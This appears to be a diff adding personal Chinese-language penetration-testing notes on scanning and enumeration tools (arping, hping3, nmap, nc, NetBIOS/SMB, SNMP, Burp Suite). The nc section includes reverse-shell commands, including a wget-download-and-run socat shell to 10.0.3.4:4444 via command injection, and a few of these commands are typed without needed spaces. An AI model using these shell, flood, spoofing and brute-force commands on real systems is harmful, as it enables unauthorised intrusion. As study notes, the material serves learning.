+	arp的包里面对于重复要查询或者响应ip会有提示。这个“提示”只会有两次请求和响应，之后再出现冲突的话才会有。
+	arp显示系统的arp缓存，命令arping给邻居主机发送ARP请求。
+	[root@idc-v-71253 ~]# arp -a #kali下也有这个命令
+	如发现某地址不稳定，可以使用arping测试该地址是否为MAC地址冲突：
+	[root@centos7 ~]# arping -d 10.0.1.252 -i eth0
+	ARPING 10.0.1.252 from 10.0.1.254 ens33
+	Unicast reply from 10.0.1.252 [ 00:50:56:A4:65:71]  0.843ms
+	Unicast reply from 10.0.1.252 [00:50:56:A4:0A:09]  1.034ms
+	这里两条返回信息中的MAC地址不同，说明有两块网卡配置了相同的IP地址。选项-I指定发送arp请求的网络接口。
+	如果刚刚更改了网卡的IP地址，但上游设备(如交换机)的arp表项还是老的，可以使用arping来强制刷新：
+	[root@centos7 ~]# arping -c3 -i eth0 -s xxxMAC 10.0.1.1
+	ARPING 10.0.1.1 from 10.0.1.254 ens33
+	Unicast reply from 10.0.1.1 [68:8F:84:01:F1:FF]  19.466ms ？？？自己发出arp reply会有接收包？？？这里接收是收到了别人的包就算一次统计
+	Unicast reply from 10.0.1.1 [68:8F:84:01:F1:FF]  2.358ms
+	Unicast reply from 10.0.1.1 [68:8F:84:01:F1:FF]  24.305ms
+	Sent 3 probes (1 broadcast(s))
+	Received 3 response(s)
+	-s 指定源地址，最后的IP表示发送目标(这里是网关地址)。数，-s指定源地址，最后的IP表示发送目标(这里是网关地址)。
+	arping www.baidu.com首先会解析成ip，然后发出arp echo包。
+	windows：
+	arp -s 157.55.85.212   00-aa-00-62-c6-09.... 添加静态项。需要管理员权限
+	arp -a                                  .... 显示 ARP 表。
+	注意：虚拟机如果使用NAT模式就会导致arping这个命令一直是失败
+
+traceroute：
+	一些网络设备会屏蔽ICMP，ping出去但是不返回。所以中间会出现***。不过自然支持arp包的传递。
+
+ping：
+	没想到ping win10已经行不通了
+	-c 指定发送包的数量
+	-r 不去查看本地路由表，直接发包给直接与接口相连网络中的某一个设备。
+	-s packetsize可以发送“死亡之ping”  最大能指定的大小是65507
+		Specifies  the  number of data bytes to be sent.  The default is
+		56, which translates into 64 ICMP data bytes when combined  with
+		the 8 bytes of ICMP header data.
+	-R 提供路由记录功能，有与ip段的存储空间有限，只能存下9个ip，下面是我ping一个直连的路由器：
+	root@kali:~# ping -R 192.168.1.1 -c 1
+	PING 192.168.1.1 (192.168.1.1) 56(124) bytes of data.
+	64 bytes from 192.168.1.1: icmp_seq=1 ttl=64 time=0.641 ms
+	RR: 	192.168.1.141
+		192.168.1.1
+		192.168.1.1
+		192.168.1.141
+	--- 192.168.1.1 ping statistics ---
+	1 packets transmitted, 1 received, 0% packet loss, time 0ms
+	rtt min/avg/max/mdev = 0.641/0.641/0.641/0.000 ms #这个时间还挺有用的
+	ping地址段的脚本，虽然是按照循环来ping，但是用wireshark抓包抓到的顺序是打乱的，可能是因为wireshark抓包的原因。
+	随着windows10的普及，考虑到防火墙还是建议在内网的话还是用arp算了。nmap win10也只能是判断主机存活
+两台虚拟机通过ping以及traceroute来查看之间的ttl：
+root@kali:~# ping 192.168.1.135  #忘了指定-c参数了
+PING 192.168.1.135 (192.168.1.135) 56(84) bytes of data.
+64 bytes from 192.168.1.135: icmp_seq=1 ttl=64 time=0.226 ms
+64 bytes from 192.168.1.135: icmp_seq=2 ttl=64 time=0.519 ms
+64 bytes from 192.168.1.135: icmp_seq=3 ttl=64 time=0.454 ms
+64 bytes from 192.168.1.135: icmp_seq=4 ttl=64 time=0.296 ms
+64 bytes from 192.168.1.135: icmp_seq=5 ttl=64 time=0.664 ms
+^C
+--- 192.168.1.135 ping statistics ---
+5 packets transmitted, 5 received, 0% packet loss, time 3998ms
+rtt min/avg/max/mdev = 0.226/0.431/0.664/0.158 ms
+root@kali:~# traceroute 192.168.1.135
+traceroute to 192.168.1.135 (192.168.1.135), 30 hops max, 60 byte packets
+ 1  ubuntu.lan (192.168.1.135)  0.110 ms  0.087 ms  0.067 ms #traceroute没有显示出我的网关，这估计是因为虚拟机就是本地创建了网络连接这个原因
+
+如果ping回来的ttl是59，并且traceroute是下面这样，那么就说明目标的ttl值是62。
+HOP RTT     ADDRESS
+1   2.13 ms Battery.lan (192.168.1.1)
+2   5.06 ms 121.48.192.1
+3   4.09 ms 223.129.64.1
+
+hping3：一种不错的控制IP、ICMP、TCP、UDP的发包工具
+	default mode     TCP
+	-0  --rawip      RAW IP mode
+	-1  --icmp       ICMP mode
+	-2  --udp        UDP mode
+	-8  --scan       SCAN mode.
+					 Example: hping --scan 1-30,70-90 -S www.target.host
+	-9  --listen     listen mode
+	-a --spoof 指定虚拟原地址
+	-c 指定发包数量
+	可以设置发包速度，其中最猛的的是--flood，在不同的模式下就是不同的flood攻击。
+	-f把包拆分成多个片段，据说这是一种绕过网络控制设备的做法
+	-p TCP/UDP模式下指定端口1,2,3,4这样的list或者是1-65535这样的range
+	
+web目录爆破：
+	dirbuster 自带一些字典，但是还是最好自己准备好。
+
+扫描原理：
+TCP ACK扫描 判断防火墙是简单设置为只允许ACK过去还是更加复杂的设置
+完整的TCP连接握手
+TCP SYN 半开扫描  返回SYN/ACK或者RST/ACK  可能变成一次DOS攻击！
+TCP FIN 如果端口关闭返回一个RST数据包，通常对UNIX系统有效。Winodws NT/2000/2003/Vista返回FIN/ACK。RFC规定不作出反应。
+TCP 圣诞树 发送一个FIN、URG、PUSH，应该返回一个RST
+TCP 空扫描 发送一个不含有任何flag的包，应该返回一个RST
+TCP 窗口扫描 侦测目标系统、端口开放、是否被过滤，返回值都会不一样
+TCP RPC扫描 仅用于UNIX，发现并确认目标系统上的RPC端口以及端口相关联的应用程序和版本号	
+UDP 扫描 看有没有返回ICMP包，没有就是开
+UDP Data扫描  根据响应包中的内容判断是否处于打开状态  非常不精准
+UDP Data+ICMP扫描 向一个端口发出多个UDP数据包，根据目标系统的相应能力判断端口是否开放  非常精准
+
+服务指纹分析技术时对抗端口改变的有效手段。banner不能配置显示什么或者配置是否有banner，除了对账号错误遇密码错误使用了不同的提示以外（任何涉及验证的都这样，telnet、web），这大概是程序员作过最傻的事情了。
+
+nmap：  刚刚还没扫出来现在出来了，改变参数！多扫几次！
+	默认情况下的先arp请求与DNS prt反向查询，发送是TCP SYN标识，对方返回了一个SYN+ACK标志以后就直接RST结束了连接
+	-o 产生输出文件，可以产生xml格式的文件 -oX xml -oA所有格式 可以同时使用多种-o
+	-A Enable OS detection, version detection, script scanning, and traceroute
+	-Pn 自己保证目标主机是开着的。
+	-f 将数据包划分成片段，实际上是将TCP表头分隔到若干个数据包当中，提高访问控制设备与IDS的侦测难度
+	-D 虚假地址
+	nmap二层扫描：（二层也就是还是arp echo来判断主机的存活）（包是按照顺序发送的，没响应就会重发一次）
+	-sn 不做端口扫描（没有-sn就会对存活设备进行端口扫描）但是还是会进行arp查询、DNS ptr查询、80端口与443端口的探查。
+	nmap -sn 一个地址段/24这样（比我们使用arping结合脚本扫描一个地址段快！）
+	-b ftp反弹扫描
+	nmap -iL addr.txt -sn 调用地址列表addr.txt里面的地址进行扫描，iL表示inputlist。
+	如果你用了参数-Px那就是其它层的扫描了，nmap在扫描前是会有DNS查询以及arp。
+	-sP进行ping扫描的时候，如果目标阻止了ICMP数据包就会自动切换到基于TCP数据包扫描
+	nmap会对得到的MAC地址进行产商识别。
+		HOST DISCOVERY:
+			nmap 1.1.1.1-254 -PA#还可以用这种方式来表示是一个段
+			-PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports
+			-PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes
+			-PO[protocol list]: IP Protocol Ping（不是ICMP的ping，而是有IPIP包头的包），但是这个使用也会发出ICMP，IGMP的包
+		SCAN TECHNIQUES:sU和sV合并就是sUV
+			-sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
+			-sU: UDP Scan
+			-sN/sF/sX: TCP Null, FIN, and Xmas scans
+			--scanflags <flags>: Customize TCP scan flags
+			-sI <zombie host[:probeport]>: Idle scan
+			-sY/sZ: SCTP INIT/COOKIE-ECHO scans
+			-sO: IP protocol scan
+			-b <FTP relay host>: FTP bounce scan
+		SERVICE/VERSION DETECTION:
+			-sV: Probe open ports to determine service/version info
+			--version-intensity <level>: Set from 0 (light) to 9 (try all probes)
+			--version-light: Limit to most likely probes (intensity 2)
+			--version-all: Try every single probe (intensity 9)
+			--version-trace: Show detailed version scan activity (for debugging)
+	nmap的udp扫描：
+		nmap -sU IP -p Port   #-sU就是进行udp扫描，然而-pU确是进行了tcp扫描
+		nmap -sU IP -p1-65535即nmap -sU IP -p-
+		udp扫描很慢很慢，因为没开也就是不理你。不过扫描自己很快。
+	脚本使用：NSE Nmap Scripting Engine  Lua编写
+		学习网址：http://www.360doc.com/content/15/0730/16/13383659_488391266.shtml  按照大类笼统地使用
+		less /usr/share/nmap/scripts/script.db 脚本查看
+		--script-args=unsafe #这样扫描会发一些危险的包，可能crash系统的一些程序
+		nmap IP -p Port --script=ipidseq.nse #这是僵尸扫描脚本
+		nmap -sT IP -p Port --script=banner.nse #banner扫描脚本
+		nmap IP --script=http-waf-detect.nse #waf检测
+		--script=smb-enum-shares.nse #已开启smb共享查看
+		nmap IP -p139,445 --script=smb-os-discovery.nse
+		nmap 192.168.1.141 -p139,445 --script=smb-vuln-* #使用windows漏洞扫描脚本，寻找匹配漏洞
+		nmap smtp.163.com -p25 --script=smtp-enum-user.nse --script-args=smtp-enum-users.methods={VRFY} 由于参数是VRFT方法，所以只会检测目标有没有root账号，后面参数其实可以是字典。
+		nmap smtp.163.com -p25 --script=smtp-open-relay.nse #如果邮件服务器打开了“开放中继”（open-relay）功能，那么所有人都可以使用你的邮件服务器去发邮件。
+		ms-sql-info脚本使得对MS SQL的扫描更加精准。msf里面的scanner/mssql/mssql_ping
+	其他参数：
+		-v 显示详细信息
+		-p-即指定扫描所有端口
+		-Pn假定主机存活
+		-D 后面加上你所需要用的IP们
+		nmap -D 192.168.1.11 192.168.1.141 192.168.1.12
+		--exclude IP 扫描的IP范围除了这个指定的IP
+		--excludefile IPfile 文件内的地址被排除
+		--dns-server <serv1[,serv2],...>
+		--traceroute
+		还有各种tcp flag组合。
+		-r顺序发包进行端口扫描
+		-T 0-5中扫描速度
+		--scan-dely 10s 每次探测间隔10s
+		nmap的服务扫描的特征码匹配并不是全部进行，你如果对扫描结果不满意就 -sV --version-intensity 0-9选一个数字级别
+		--script-updatedb 更新脚本库（--script-update也可以）
+		--script-help 脚本   告诉你这个脚本是干什么用的
+		-O 操作系统扫描
+		-S 伪造原地址
+		-g 指定自己这边发送的源端口
+		--data 在包的数据段里面加上自己指定的东西，用十六进制表示
+		nmap IP -p Port --data=FFFFFFF
+		--ttl 指定ttl值
+		--spoof-mac 后面跟虚假mac
+		-6 开启IPv6扫描
+		-A 即-O  --traceroute  -sV --script=xxxx的整合
+		-oG 由管道输出扫描到的活着ip地址，和nikto一起使用
+	IP还可以这么使用
+		nmap 192.168.1.0/24 
+		nmap -v -p 139,445 192.168.1-20
+		nmap -v -p 139,445 192.168.1,2	
+	不论对于哪种nmap扫描方式，都会先进行目标存活的探查（用tcp SYN探查443，用tcp ACK探查80），如果存活或者使用-Pn参数，就会进行DNS ptr解析与扫描。如不存活就直接停止。	
+	
+nc：
+	type xxx.txt | nc -nv xxx xx  文件重定向的方式有很多
+	可以与telnet互联，如果通过telnet来反弹shell：
+telnet 127.0.0.1 80 | /bin/bash | telnet 127.0.0.1 25  不能两个telnet都是同一个端口，因为后面那个会绑定端口失败
+	nc -lp 3389  默认监听127.0.0.1
+	-e filename		program to exec after connect。你可以传送一个bash
+		python -c 'import pty; pty.spawn("/bin/bash")' 就会在nc获得的伪终端中开启一个平常一样的真终端
+		socat是一个netcat上的替代工具，可以说是nc的增强版。使用socat可以获得交互性和平常类似的终端：KALI上执行socat file:`tty`,raw,echo=0tcp-listen:4444，受害机上面执行socatexec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444。通过命令注入漏洞，我们可以将socat二进制文件下载到一个可写的目录，并通过chmod命令修改文件的执行权限，然后在一行中执行反向shell：
+wget -qhttps://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat;chmod+x/tmp/socat;/tmp/socatexec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
+
+	-c 传递命令到对方，对方使用nc -lp接收以后就会执行
+	-n 只接受数字ip，而不会DNS
+	-v verbose
+	-p 是指定本地监听端口，不能用于客户端来连接！
+	-z 扫描
+	-w 每条连接的超时时间设定 -w2
+	root@kali:~# nc -nvz 192.168.1.1 1-1000
+	^T(UNKNOWN) [192.168.1.1] 445 (microsoft-ds) open
+	(UNKNOWN) [192.168.1.1] 139 (netbios-ssn) open
+	(UNKNOWN) [192.168.1.1] 80 (http) open
+	(UNKNOWN) [192.168.1.1] 53 (domain) open
+	(UNKNOWN) [192.168.1.1] 23 (telnet) open
+	(UNKNOWN) [192.168.1.1] 22 (ssh) open
+	root@kali:~# nc -vz 192.168.1.1 1-1000
+	Battery.lan [192.168.1.1] 445 (microsoft-ds) open
+	Battery.lan [192.168.1.1] 139 (netbios-ssn) open
+	Battery.lan [192.168.1.1] 80 (http) open
+	Battery.lan [192.168.1.1] 53 (domain) open
+	Battery.lan [192.168.1.1] 23 (telnet) open
+	Battery.lan [192.168.1.1] 22 (ssh) open
+	视频中连接80 端口 之后get /，视频中返回有一条"Login with msfdamin/msfadmin to get started"，说msfadmin就是登录账号。先存在文件中，然后通过文件来输入重定向就能通过nc发送一个自己想要的包。
+	奈何我访问路由器的LuCI，不能真正模仿curl进行get，如果你输入了多行数据就会每一行一个tcp发出去，flag是PSH与ACK，我直接get /不行目测是因为路由器里面做了对其他header的要求。
+	root@kali:~# nc -nv 202.115.33.141  80
+(UNKNOWN) [202.115.33.141] 80 (http) open
+Get /
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd">
+<HTML><HEAD><TITLE>Bad Request</TITLE>
+<META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></HEAD>
+<BODY><h2>Bad Request - Invalid Verb</h2>
+<hr><p>HTTP Error 400. The request verb is invalid.</p>
+</BODY></HTML>
+
+	不过抓包看到了nc连接了以后会不停地发送keep-alive包，然而过了一会以后连接还是断开了。
+	22端口除了可能暴露ssh版本还可能暴露操作系统版本
+
+	终端SMTP连接：
+	AUTH LOGIN 这是请求身份认证
+	后面邮箱与密码格式	
+	SMTP扫描主要是为了发现邮箱账号
+	nc -nv IP 25(默认端口是25)
+	VRFY root #VRFY就是verify #查看是否有root用户名
+	
+	telnet可以进行查点，VRFY验证用户是否存在，expn查询别名和邮件表中的实际发送地址
+	
+五层banner扫描之py socket脚本或者交互模式：  直接nc查看不是更好
+	import socket
+	banner=socket.socket(socket.AF_INET, socket.SOCK_STREAM)  #socket对象在socket库么
+	banner.connect("IP",Port)
+	banner.recv(收包大小)  #完成全连接就会返回banner信息
+	banner.close()
+	exit() or C-D
+	但是在程序上一旦banner没有被抓取，也就是没有返回，程序就会一直在等待：
+	import select #i/o复用
+	ready =select.select([banner],[],[],1)
+	  if ready[0]: #如果没有被挂起
+		 xxxx
+
+tcp79号端口上的finger
+	finger -l @xxx.xx.xx.x
+	finger 0@xxx.xx.xx.x
+
+都怪没有身份验证，全靠防火墙大哥。
+tcp135端口的MSRPC：  显示远程访问服务RAS，可以知道接入网络服务器数目
+	epdump （windows工具） 查询出MSRPC的endpoint mapper，并显示服务绑定的IP地址和端口号。
+	linux 下查点使用rpcdump.py
+Unix RPC：tcp 111 或者32771（Sun的Solaris系统在这里还运行着一个端口映射器）  rpcbind进程为主
+	rpcinfo 直接查询在xx端口有xx服务。  需要安装rpcbind才会有rpcinfo
+	service portmap stop
+Unix NIS 查点：具体进程名不止一种
+	NIS（Network Infomation System）网络信息系统，一旦被得到服务其的NIS域名，使用RPC查询就可通过NIS映射（主机关键信息）返回信息。
+	使用工具psan -n
+	PS：基于安全有身份认证的RPC的NIS叫NIS+。
+	
+nfs查点：
+	需要安装nfs-common
+	
+udp137端口上的NetBios名字服务： 
+	工具基本系统自带，而且全都是轮询查询，所以查询整个网段是正常的
+	windows下使用net view命令
+	C:\Users\FindMe\Desktop>net view  解析自己工作组的
+	服务器名称            注解
+	-------------------------------------------------------------------------------
+	\\(NONE)               PandoraBox Share
+	\\GSH
+	\\PC-20170224DKLA
+	\\SKYUSER-3U21IH9
+	\\WIN-GJD439HFB97
+	命令成功完成。
+
+	C:\Users\FindMe\Desktop>net view /domain
+	Domain
+	-------------------------------------------------------------------------------
+	WORKGROUP
+	命令成功完成。
+
+	C:\Users\FindMe\Desktop>net view /domain:workgroup
+	服务器名称            注解
+	-------------------------------------------------------------------------------
+	\\(NONE)               PandoraBox Share
+	\\DESKTOP-FRNFA24
+	\\GSH
+	\\PC-20170224DKLA
+	\\SKYUSER-3U21IH9
+	\\WIN-GJD439HFB97
+	命令成功完成。
+
+	nltest(windows自带工具)：
+		nltest /dclist:workgroup
+		/PARENTDOMAIN - 获取此计算机的父级域名
+		/DCLIST:<域名> - 获取 <域名> 的 DC 列表
+		 
+
+	nbtstat（windows自带工具）：
+	C:\Users\FindMe>nbtstat -A 192.168.1.147
+	本地连接:
+	节点 IP 址址: [192.168.1.235] 范围 ID: []
+			   NetBIOS 远程计算机名称表
+		   名称               类型         状态
+		---------------------------------------------
+		DESKTOP-FRNFA24<00>  唯一        已注册
+		WORKGROUP      <00>  组          已注册
+		DESKTOP-FRNFA24<20>  唯一        已注册  这里00和20分别是工作站服务、服务器服务的NBNS服务代码
+		MAC 地址 = D0-50-99-9A-26-31
+	C:\Users\FindMe>netstat -s
+	IPv4 统计信息
+	  接收的数据包                   = 8380
+	  接收的标头错误             = 0
+	.....
+	IPv6 统计信息
+	.....
+
+	root@kali:~# nmblookup DESKTOP-FRNFA24   完全相当于windows下的netstat
+	192.168.1.147 DESKTOP-FRNFA24<00>
+	192.168.45.1 DESKTOP-FRNFA24<00>
+	192.168.221.1 DESKTOP-FRNFA24<00>
+	root@kali:~# nmblookup  -A 192.168.1.147 IP反查
+	Looking up status of 192.168.1.147
+		DESKTOP-FRNFA24 <00> -         M <ACTIVE> 
+		WORKGROUP       <00> - <GROUP> M <ACTIVE> 
+		DESKTOP-FRNFA24 <20> -         M <ACTIVE> 
+
+		MAC Address = D0-50-99-9A-26-31
+	root@kali:~# nmblookup -A 192.168.1.147  使用了-A参数才能用ip
+	Looking up status of 192.168.1.147
+		DESKTOP-FRNFA24 <00> -         M <ACTIVE> 
+		WORKGROUP       <00> - <GROUP> M <ACTIVE> 
+		DESKTOP-FRNFA24 <20> -         M <ACTIVE> 
+
+		MAC Address = D0-50-99-9A-26-31
+
+	nbtscan（nbtstat的群发升级版  windows、linux都有版本）：
+	$ nbtscan-1.0.35.exe 192.168.1.0/24
+	192.168.1.1     WORKGROUP\(NONE)                SHARING
+	192.168.1.208   WORKGROUP\DESKTOP-RPGGEPI       SHARING
+	192.168.1.235   WORKGROUP\WIN-GJD439HFB97       SHARING
+	*timeout (normal end of scan)
+
+	$ nbtscan-1.0.35.exe  -f 192.168.1.232
+	192.168.1.232   WORKGROUP\WWW-EXPLOIT           SHARING
+	  WWW-EXPLOIT    <00> UNIQUE Workstation Service
+	  WWW-EXPLOIT    <20> UNIQUE File Server Service
+	  WORKGROUP      <00> GROUP  Domain Name
+	  WORKGROUP      <1e> GROUP  Browser Service Elections
+	  00:0c:29:9e:67:b8   ETHER  www-exploit.lan
+
+
+	root@kali:~# smbtree  扫描并以树形显示
+	Enter root's password:    这里的密码是域管理员的密码
+	WORKGROUP
+		\\WIN-GJD439HFB97		
+		\\SKYUSER-3U21IH9		
+		\\PC-20170224DKLA		
+		\\GSH            		
+		\\DESKTOP-FRNFA24	
+		
+		
+错误号 5 ，拒绝访问：很可能你使用的用户不是管理员权限的；
+	空连接：
+		空会话能访问的是Everyone、Network有权访问到的一切信息。
+		C:\Users\FindMe>net use \\192.168.1.232\IPC$ "" /u:""  ""使用空口令 /u:""匿名用户
+		如果空连接被禁用，当net time \\192.168.1.232查看时间或者net view \\192.168.1.232查看分享的资源 因为没有权限所以会导致"发生系统错误 5。拒绝访问"，这个错误代表权限不够。
+
+		C:\Windows\system32>net share
+		共享名       资源                            注解
+		-------------------------------------------------------------------------------
+		C$           C:\                             默认共享
+		IPC$                                         远程 IPC
+		ADMIN$       C:\Windows                      远程管理
+		139/445的查点服务： 开启了文件共享（会有共享卷）与打印机共享
+		net share ipc$ 打开空连接
+		net share ipc$ /del 删除空连接
+		net share xinxin=c:\ 共享文件夹
+		如果开启了远程注册表服务：HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg\AllowedPaths 中指定了是否允许空会话访问其他键，默认只能访问HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion
+	最好的空连接建立信息获取工具：dumpsec
+	扫描+共享卷：softperfect network scanner（netscan）、hyena（超级棒的图形化管理软件）
+	共享卷brute：hydra爆破smb
+	win7、winServer2008默认不能从远程访问SMB，但是Windows Server域控制器，会被自动重新配置成可被网络访问，这时候最有效的方法就是进入共享卷。
+	
+LDAP查点：  tcp 389
+	前提：任何一个可登录域控制器的账户、域名、ldap的根目录DC=hellovega,DC=cn这样
+	使用：ldp.exe（windows）  或者 ldapenum（双平台）
+	得到：所有的用户名和组名以及根目录内容
+	原因：为了一些遗留服务，放宽了条件（本质上是系统内建本地组的everyone成员资格问题）
+
+IPse VPN： udp 500
+	VPN 服务其的两种认证方式：预先共享的密钥（所有客户端都有这一样的密钥）、证书认证（想到了ssh证书）
+	远程连接的都能限制源ip
+	使用主模式还是激进模式（不是所有的场合都适合使用主模式，比如对于对端的链接无法使用固定ip地址来确定时（如adsl），只能使用域名来定义，这个时候，主模式就不能用，只能使用积极模式）
+	如果是预共享密钥的情况下，主模式是不支持NAT穿越的，而积极模式可以支持NAT穿越。而在证书认证的情况下，主模式和积极模式都是支持NAT穿越的。
+	激进模式不提供安全信道，是能被嗅探监听的。
+	格式错误的包不会被响应，增加扫描难度
+	查点工具：ike-scan （如果是Aggressive模式，加-A）
+	
+	
+	
+xprobe2：  不过经常会遇到显示中的乱码
+	使用多种方法，得出的猜测也有点多
+	xprobe2 IP
+	判断操作系统类型的方法和扫描本质上是一样的，就是找不同，操作系统的不同：
+开放的端口
+运行的服务。各种服务banner中信息的泄露*
+/proc/重要文件的泄露
+TCP FIN 因为windows协议栈实现机制，竟然会返回一个FIN/ACK。RFC规定是不作出反应。
+TCP 无效标志探查 发送未定义的TCP标志，linux等操作系统会在响应包里面返回一样的标志
+TCP ISN采样   前提是TCP返回的初始序列号有特征可查
+TCP DF位监控 为了能改善性能，有的操作系统会设置不允许对数据包进行查分的DF位。
+TCP 初始数据窗长度 对TCP/IP协议栈的实现来讲，这个长度值是独一无二的。
+TCP ACK值 ACk字段里面的序列号是原封不动地返回还是+1再返回
+TCP选项还有“无操作”、“最大分段长度”、“数据窗缩放比例”、“时间戳”
+ICMP 出错消息机制 不同操作系统对ICMP出错消息的频率做出的限制是不同的
+ICMP 消息内容  发生ICMP错误的时候，内部的内容引述是不同的
+ICMP IP表头   协议栈的某一些具体实现，会在返回ICMP出错信息的时候改变请求包的IP表头
+ICMP TOS	通过ICMP port unreachable中的TOS（type of service）字段判断，大部分设置为0
+观察目标系统是如何组装数据包的，，新数据包有没有覆盖旧的数据包。
+就是nmap -O 主动协议栈分析
+
+被动协议栈分析：（可以看起来不是那么主动就是被动）
+TTL
+windows size
+DF
+
+
+
+	对端口上的服务进行检测 传闻这一点上超越nmap
+amap：a tool to identify application protocols on target ports
+	root@kali:~# amap 192.168.1.1 1-1000 -q 
+	Protocol on 192.168.1.1:23/tcp matches telnet
+	Protocol on 192.168.1.1:22/tcp matches ssh
+	this connect
+	this connect...会出现一大堆这个，真的很不好
+	-B 仅仅获取banner信息
+	-q Do not report closed ports, and do not print them as unidentified
+	amap -B IP Port 不错，nc查看banner还可能会乱码
+
+lbd: load balancing detector	
+	lbd IP
+	
+wafw00f：
+	-l显示能检测的有什么waf
+
+snmp扫描之onesixtyone：识别硬件架构与操作系统版本、	
+	Windows XP 被识别为Windows 2000 LAN Manager
+	onesixtyone IP community 如onesixtyone 192.168.1.141 public
+	-c 后面加上community字典
+	-o 后面指定结果输出文件，同效果于>> or >
+	-w 发出包之间等待多少毫秒
+	使用community的字典进行扫描：
+	onesixtyone -c dict.txt IP 
+	dpkg -L onesixtyone可以找到自带字典
+snmp扫描之snmpwalk:
+	信息按照snmp MIB数据库里面的编号（oid）来显示。磁盘序列号、系统目录、一些系统进程等全显示了
+	-v 后面跟使用的snmp版本，有1、2c、3（加了安全机制----加密，身份验证）
+	snmpwalk 192.168.1.141 -c public -v 2c
+snmp扫描之snmp-check（而不是界面化的snmpcheck，界面化了似乎用不了）：
+	-v --version     : SNMP version (1,2c). Default is 1;
+	-p --port        : SNMP port. Default port is 161;
+	-c --community   : SNMP community. Default is public;
+	snmp-check IP
+通过MIB walk和browser，可以获取ip路由表和端口列表甚至Vlan分配表。通过SNMP的弱口令（）可以一直拿下交换机、路由器设备，了解整个网络结构。
+public（可读）、private（可读可写）还有些非标准的常用字符：manager、admin。
+
+
+nbtscan：
+	nbtscan —  program for scanning networks for NetBIOS name information
+	据说其优点是可以跨网段扫描
+	-r 使用137端口（为了兼容win95）进行扫描
+	nbtscan -r IP
+enum4linux：
+	-a        Do all simple enumeration (-U -S -G -P -r -o -n -i).
+			  This opion is enabled if you don't provide any other options.
+	enum4linux -a IP
+	
+	
+MSSQL：
+	sqlping 工具会查询udp1434端口，并获取版本号、实例名字、监听端口等信息
+
+Oracle TNS：Transparent Network Substrate 透明网络底层
+	TNS由lsnrctl监听，tnslsnr控制数据库与客户端通信
+	
+burpsuite：  截断代理类型是HTTP
+	记得设置http中字体的显示，不然中文乱码（在Option-》display）。bp对中文支持不太好即便是检索字段。
+	代理：
+	代理功能支持对sockets的发现
+	不可见代理可以用于对于不支持代理的应用，使用DNS欺骗（通过修改本地host文件）（但是burpsuite也是在本机，他还是需要对域名进行解析，所以要想不变成死循环就需要在设置中直接设定域名和对应IP之间的解析关系。也可以直接在Request handling中设置重定向IP和port，那么请求都会被发向这个）来进行代理。
+	不支持代理的客户端的包可能看起来想：
+	GET /login.php HTTP/1.1
+	Host:xxxx.com
+	一般的http代理不能将host与不完全的GET连接，不过burpsuite可以。但是有的client写的不规范，甚至没有Host头，这时候要想完成代理，只能用重定向的方法。
+	不过出现了多个这样的客户端怎么办？在本地设置多个loopback网卡也就是ifconfig里面的lo，设置了多个不同的回环IP，使在host里面将不同的域名解析到不同的回环ip（brupsite里面可以设置）。
+	代理以后截断功能是根据设置的正则表达式选择的。
+	需要把设置里面“自动调整http头大小”的选择勾起来
+
+	证书可以在软件里面导出，也可以访问http://burp。格式的话就是DER格式。
+	导入chrome需要放到“受信任的根证书里面”
+
+	Free版本没有主动扫描的机制
+
+	repeat模块里面，返回包右下角会显示字节数目，这对我流量分析很有用。
+	设置系统代理，专门留一个获取可用session的Repeat重发。Repeat在GET里面注入的时候记得空格要用+或者%20，否则400 Bad Request。
+	有时候，burp发包总是500server error。我的虚拟机访问本科系统一直是。总有浏览器的逗逼原因。脚本却异常灵验，不过不清楚为什么bp也有点容易触发500Server Error。这时候就自己与系统交互了下，然后取一个包作为repeat使用，情况好了一些。
+
+	Spider模块：爬虫的范围在Target的Scope中
+		遇到表单就会弹框问你是否输入，每遇到一个form就弹。因为默认设置选中的就是向导提示
+		可以在这里设置爬网请求头。
+	Target模块：
+		可以比较两次爬站内容（请求与响应）来寻找攻击点。选取现成站点或者导入已经保存State导入来比较。
+		从这里选取爬虫的Scope和Scan的范围。
+
+	Proxy模块的Options：
+		这个部分主要是对请求包和响应包的内容进行设置，包括gzip解包、使用HTTP/1.0，是否保留Proxy头部。
+		response modify：
+		Remove JavaScript form validation去除对用户提交表单的验证。
+		Math and Replace:
+		可以用来替换请求、响应包的内容。原来手机的User-Agent和电脑的都不一样。
+
+	Scan模块：
+		支持被动代理扫描和主动爬网扫描。
+
+	Intruder模块：
+		add按钮定义变量
+		Sniper一次只替换一个；Battering ram是多个一起替换成一个值；Pitchfork每个文件同行输出，每个文件对应一个变量，各个文件取第一个各个文件取第二个这样子；Cluster bomb一个文件4条记录，另一个文件6条记录于是会有24次尝试。
+		在Options中Match设置密码破解出来的字符，用于爆破确认密码破解成功
+		还可以自己设置一些Payload，也就是把一些字符导入，选择反转、大小写变化等自动攻击。自己集成了一些fuzz字典包含通过URL特殊文件访问，SQL注入。
+
+	Repeater模块：
+		就像是一个可以重放攻击的操作便捷的浏览器
+		
+	Sequence模块：
+		将有set-cookie的包发送过来，先选择出要判断的部分sessionid，然后通过大量地先服务器发送请求，然后自动寻找规律。
+		会基于字节和位进行分析，按照FIPS衡量和评价的标准。
+		
+	Extender模块：
+		插件导致burp出错，jython下载提示，推荐插件：J2EE scan，CO2（图形化连接sqlmap，会建立一个新标签）。
+
+	左上角，Save the Status，可以选中保存仅仅Scope（自己调整下Scope）中的来去掉不必要的部分。
+截断代理工具还有Paros、Webscrab。
+	
+	75.openwrt使用dropbear服务器进行ssh连接，为了安全，给dropbear指定允许ssh连接的路由器端口。
+	77.开了赛风代理以后，居然不能连接到路由器，看来路由器是https？不，还是http。这是因为，分组会直接发给代理，然后再发出去，192.168.1.1是本地地址所以代理是找不到的，代理找的只是自己的192,168,1,1。
+	78.文件协议SCP，还是不同于ssh连接协议。
+	79.走运：
